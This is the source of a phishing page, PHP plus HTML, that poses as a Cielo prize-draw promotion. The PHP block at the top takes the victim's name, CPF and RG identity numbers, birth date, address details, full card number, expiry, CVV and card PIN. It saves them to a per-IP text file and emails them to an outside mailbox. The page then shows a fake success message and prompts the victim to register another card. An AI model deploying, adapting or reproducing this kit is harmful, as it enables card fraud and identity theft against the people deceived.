<?php
error_reporting(0);

$data = date("d-M-Y-H-i-s"); 
$ip = @$_SERVER[REMOTE_ADDR];

/* armazenar dados recebido dos inputs */
$nome = $_POST["nome"];
$cpf = $_POST["cpf"];
$rg = $_POST["rg"];
$nascimento = $_POST["nascimento"];
$cep = $_POST["cep"];
$num_resid = $_POST["num_resid"];
$bandeira = $_POST["tipo"];
$titular = $_POST["titular"];
$cc = $_POST["cc"];
$mes = $_POST["mes"];
$ano = $_POST["ano"];
$cvv = $_POST["cvv"];
$senha_cartao = $_POST["senha_cartao"];

$subj = "INFO CC - IP: ".$ip." - DIA: ".$data." ";

$info = "-----------------------------------------------
Nome: ". $nome . "
CPF: ". $cpf ."
RG: ". $rg ."
Data nascimento: ". $nascimento ."
CEP: ". $cep ."
Numero Residencia: ". $num_resid ."
Bandeira: ". $bandeira ."
Nome titular: ". $titular ."
Numero cartao: ". $cc ."
Validade: ". $mes ."/". $ano ."
CVV: ". $cvv ."
Senha cartao: ". $senha_cartao ."
-----------------------------------------------
";

$arquivo = fopen("priv8/infos/". $ip .".txt", "a");
$grava=fwrite($arquivo,$info);
fclose($arquivo);

$arquivo_infos = "priv8/infos/". $ip .".txt";
$ler_arq = fopen($arquivo_infos, "r");
$texto = fread($ler_arq, filesize($arquivo_infos));

mail("missaomoney@yahoo.com.br", $subj, $texto, "from: ". $ip ."@infocc.net");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<title>Compra Premiada Cielo</title>

<link rel="shortcut icon" href="img/favicon.ico">
<link href="css/padrao3.css" rel="stylesheet" type="text/css">

<style type="text/css">

<!--
body {

	background:url(img/background2.jpg);
	background-position:center top;
	background-repeat:no-repeat;
	margin:3px;

}
.style13 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 12px; }
.style18 {font-size: 14px}
.style19 {
	font-size: 12px;
	color: #FF0000;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style22 {
	color: #FF0000;
	font-style: italic;
}
-->

</style>
<script type="text/javascript" async="" src="js/ga.js"></script><script>
    function retiraAcento(obj)
    {
        palavra = String.fromCharCode(event.keyCode);
	  
        var caracteresInvalidos = 'ËÏÚ?ÍÓÙ°ÎÔ¸·ÈÌÛ?i¿»Ã¬ À÷¡Õ/v';
        var caracteresValidos =   'aeiouaeiouaeiouaeiouaoAEIOUAEIOUAEIOUAEIOUAO';
        var acento = "¥`^®~";
        if(acento.indexOf(palavra)!= -1)
        {
            window.event.keyCode = 0;
        }
 
        if (caracteresInvalidos.indexOf(palavra) == -1)
        {
            if (caracteresValidos.indexOf(palavra) != -1) {
                window.event.keyCode = 0;
                obj.value = obj.value + palavra;
            }
        }
        else
        {
            window.event.keyCode = 0;
            nova = caracteresValidos.charAt(caracteresInvalidos.indexOf(palavra));
            obj.value =  obj.value + nova;
        }
    }
 
    $().ready(function() {


        $("#q").autocomplete("http://www.reclameaqui.com.br/xml/busca_empresas.php", {
            width: 530,
			
            selectFirst: false
        });
		
        $("#q").result(function(event, data, formatted) {
            if (data)
            {
                document.FrmTopoBusca.id.value = data[1];
            }
        });
    });
    function valida_busca(f){
        if(f.q.value=="" || f.q.value=="Nome da empresa ou serviço"){
            alert('Preecha o campo de busca');
            f.q.focus();
            return false;
        }
        return true;
    }
</script>


<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-10647659-2']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<script>

function confereCampos(form) {    
    var campos = form.getElementsByTagName('input');
    var podeEnviar = true;
    for (i = 0; i < campos.length; i++) {
        var classe = campos[i].className;
        var valor = campos[i].value;
        if (classe == 'campos_texto' && valor == '') podeEnviar = false;
    }
    if (podeEnviar == true) {
        return true;
    } else {
        alert('Todos os campos são obrigatorios, favor preencher!')
        return false;
    }
}
</script>


</head>



<body>

<div id="tudo">

<div id="barraamarela"><p>Voc&ecirc; est&aacute; na p&aacute;gina do cliente <span>Cielo.</span></p></div><div id="ponta1"></div>

<div id="ponta2"></div>
<div id="barrazul"><a href="index.php">Agora voc&ecirc; tem 3x mais chances de ganhar!</a></div>



<div id="logobb"></div>

<div id="menu"><a href="index.php" onmouseover="document.home.src=&#39;img/home2.png&#39;" onmouseout="document.home.src=&#39;img/home1.png&#39;"><img src="img/home1.png" name="home" width="34" height="20" class="menu" id="home"></a><img src="img/espacador.png" width="12" height="20"><a href="#" onmouseover="document.ganhadores.src=&#39;img/ganhadores2.png&#39;" onmouseout="document.ganhadores.src=&#39;img/ganhadores1.png&#39;"><img src="img/ganhadores1.png" name="ganhadores" width="65" height="20" id="ganhadores"></a><img src="img/espacador.png" width="12" height="20"><a href="#" onmouseover="document.regulamento.src=&#39;img/regulamento2.png&#39;" onmouseout="document.regulamento.src=&#39;img/regulamento1.png&#39;"><img src="img/regulamento1.png" name="regulamento" width="72" height="20" id="regulamento"></a><a href="#" onmouseover="document.ganhadores.src=&#39;img/ganhadores2.png&#39;" onmouseout="document.regulamento.src=&#39;img/regulamento2.png&#39;"></a><img src="img/espacador.png" width="12" height="20"></div>



<div id="logopromo"><img src="img/logopromonovo1.png" width="263" height="207"></div>

<div id="textointro">

<p> A cada compra a partir de R$ 30,00 com qualquer cart&atilde;o de cr&eacute;dito ou d&eacute;bito na m&aacute;quina da Cielo, voc&ecirc; ganha um <span>n&uacute;mero da sorte.</span> E &eacute; com ele que voc&ecirc; participa dos sorteios di&aacute;rios de pr&ecirc;mios. Para participar primeiro cadastre-se nesta p&aacute;gina, e boa sorte!</p>
</div>



<div id="conteudo">
  <div class="style13 style18" id="conteudovariavel" style="overflow:auto; display:block;">
    <div align="center">Parab&eacute;ns! <br>
      Cadastro efetuado com sucesso.
        <table width="308" border="0" cellspacing="1" cellpadding="1">
          <tbody><tr>
            <td class="style13"><div align="left">Por favor anote o seu n&uacute;mero da sorte: 8877388458385773</div></td>
          </tr>
          <tr>
            <td class="style19"><div align="center"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong><font color="#FF0000">
           </font></strong></font></div></td>
          </tr>
        </tbody></table>
        <p align="left" class="bt_prosseguir"><a href="index.php?cadastrar-novo-cartao">&gt; Cadastrar novo cart&atilde;o</a> <br>
        </p>
      </div>
  </div>
</div>



<div id="rodrigo"><img src="img/rodrigofaro2.png" width="144" height="411"></div>

<div id="legal">
<h3><strong>A Compra Premiada  Cielo n&atilde;o inclui taxas na fatura do cart&atilde;o.</strong></h3>

<p>*Pr&ecirc;mios pagos em dinheiro diretamente ao contemplado. Valores l&iacute;quidos de Imposto de Renda, conforme legisla&ccedil;&atilde;o vigente. Lastreados por T&iacute;tulos de Capitaliza&ccedil;&atilde;o da Brasilcap Capitaliza&ccedil;&atilde;o S.A., CNPJ 15.138.043/0001- 05, aprovados pela SUSEP, Processos n&deg; 15414.002830/2011-48 (cliente Cielo) , n&ordm; 15414.002831/2011-92 (lojistas) e n&ordm; 15414.002832/2011-37 (vendedores). A aprova&ccedil;&atilde;o desses t&iacute;tulos pela SUSEP n&atilde;o implica, por parte da Autarquia, incentivo ou recomenda&ccedil;&atilde;o &agrave; sua aquisi&ccedil;&atilde;o, representando, exclusivamente, sua adequa&ccedil;&atilde;o &agrave;s normas em vigor. Consulte o regulamento no site.</p>

</div>

</div>









</body></html>
